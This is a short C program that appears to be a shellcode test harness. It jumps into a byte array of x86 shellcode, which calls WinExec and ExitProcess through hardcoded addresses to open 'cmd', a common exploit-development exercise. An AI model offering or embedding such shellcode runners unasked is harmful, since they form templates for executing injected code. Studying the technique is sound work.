#include <stdio.h>

char shellcode[] = 
"\x33\xDB"
"\x89\x5D\xFC"
"\xC6\x45\xFC\x63"
"\xC6\x45\xFD\x6D"
"\xC6\x45\xFE\x64"
"\x6A\x05"
"\x8D\x45\xFC"
"\x50"
"\xB8\x30\x3A\xB2\x74"
"\xFF\xD0"
"\x6A\x01"
"\xB8\x20\x3A\xAE\x74"
"\xFF\xD0";

int main() {
	int* shell = (int*)shellcode;
	__asm {
		jmp shell
	};

	return 0;
}